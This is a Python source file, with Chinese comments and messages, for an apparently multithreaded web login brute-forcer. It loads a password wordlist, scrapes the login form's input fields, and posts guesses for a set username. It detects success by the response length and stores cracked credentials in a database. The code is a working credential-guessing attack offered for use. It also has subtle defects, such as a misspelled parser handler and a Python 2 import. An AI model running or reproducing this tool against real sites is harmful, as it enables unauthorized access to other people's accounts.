#coding: utf-8
import urllib.request as urllib2
import urllib
from urllib.parse import urlencode
from urllib.parse import unquote
#import cookielib
from http import cookiejar
import threading
import sys
import queue
import sys
import pymysql
#reload(sys)
from HTMLParser import HTMLParser
from db import DB
sys.path.insert(0,'.')
from config import config



#爆破部分
class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_startag(self,tag,attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name,value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value
            if tag_name is not None:
                self.tag_results[tag_name] = tag_value
class Bruter(object):
    def __init__(self,target_url,target_post,username,words):
        self.username = username
        self.password_q = words
        self.target_url = target_url
        self.target_post = target_post
        self.find = False
        print("设置爆破用户为：%s" %username)

    def run_bruteforce(self):
        for i in range(thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        while not self.password_q.empty() and not self.find:
            brute = self.password_q.get().decode().rstrip('\n')   #去除字符串末尾的空格
            jar = cookiejar.FileCookieJar("cookies")
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
            response = opener.open(self.target_url)
            page = response.read()
            print("爆破用户：%s ------> 尝试密码：%s -------> 剩余密码数：%s" %(self.username,brute,self.password_q.qsize()))

            parser = BruteParser()
            parser.feed(page.decode())   #返回标签的集合
            post_tags = parser.tag_results

            post_tags[username_tag] = self.username
            post_tags[password_tag] = brute
            # print post_tags
            login_data = urlencode(post_tags)
            login_response = opener.open(self.target_post,login_data.encode())
            #print login_response.read()
            login_result = login_response.headers  # 这个一部因目标而异
            s_login_result = int(login_result["Content-Length"])
            # print s_login_result
            # print login_result["Content-Length"]
            if s_login_result != 34:
                self.find = True
                # print login_result["Content-Length"]
                print("恭喜爆破成功！！！")
                print("用户名%s它的密码为：%s" %(self.username,brute))
                print("等待爆破线程退出........")
                db = DB(self.target_url,self.username,brute)
                db.burstdb()




def wordlist(wordlist_file):
    #self.wordlist_file = e_wordlist_file
    fl = open(wordlist_file, "rb")
    raw_words = fl.readlines()
    fl.close()

    find_resume = False
    words = queue.Queue()

    for word in raw_words:
        word = word.rstrip()
        if resume is not None:
            if find_resume:
                words.put(word)
            else:
                if word == resume:
                    find_resume = True
                    print("恢复爆破位置: %s" % resume)
        else:
            words.put(word)

    return words

def explode(target_url,target_post,username,e_wordlist_file):
    wordlist_file = e_wordlist_file
    words = wordlist(wordlist_file)
    bruter_obj = Bruter(target_url,target_post,username,words)
    bruter_obj.run_bruteforce()


#爆破部分
thread = 5
resume = None
username_tag = config.username_tag
password_tag = config.password_tag
# success_tag = ""


